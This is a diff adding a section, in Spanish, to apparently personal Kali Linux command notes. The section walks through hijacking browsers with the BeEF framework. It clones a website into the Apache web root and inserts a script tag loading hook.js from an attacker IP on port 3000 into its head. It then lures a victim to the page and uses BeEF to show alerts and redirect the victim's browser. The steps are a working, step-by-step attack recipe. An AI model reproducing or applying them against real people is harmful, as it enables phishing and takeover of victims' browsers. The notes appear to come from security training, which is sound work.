@@ -580,6 +580,39 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Volver al kali, las credenciales asociadas estarán visibles
 
 
+++ Exploit de navegadores web usando Beef
+--- cd /usr/share/beef-xss
+--- ./beef
+--- Aparecerán dos enlaces:
+----- Hook URL: URL con el código malicioso que toma control sobre el navegador
+----- UI URL: URL de la interfaz gráfica del programa 
+--- Copiar el UI URL y acceder al mismo (credenciales = beef/beef)
+--- Abrir otra terminal y navegar a cd /var/www/html (Ubicación del servidor apache)
+--- wget <url_del_sitio_web_a_clonar>
+--- nano index.html 
+--- En la sección head colocar el Hook URL, siguiendo la siguiente sintaxis: 
+<script type="text/javascript" src="http://192.168.0.17:3000/hook.js"> </script>
+--- Ctrl + G para guardar y Ctrl + X para salir
+--- Ir a la pc de la víctima e ingresar la ip del kali
+--- Ir a la interaz web de beef
+--- Se nos mostrará el acceso hecho en la sección de Hooked Browsers
+--- Se procede a dar clic en la ip asociada a dicho browser
+--- Ir a la sección de Commands
+--- Buscar alert
+--- Seleccionar Create Alert Dialog
+--- Indicar el mensaje de alerta
+--- Dar clic en execute
+--- Ir a la pc de la víctima, en su navegador se verá el mensaje anteriormente puesto
+--- Volver a la interfaz gráfica de beef
+--- Buscar en la sección commands la opción redirect
+--- Seleccionar la opción redirect browser
+--- Indicar la URL a la que se desea redireccionar
+--- Dar clic en execute
+--- Volver a la pc de la víctima, el redireccionado ha de haberse llevado a cabo
+
+
+
+
 
 
 
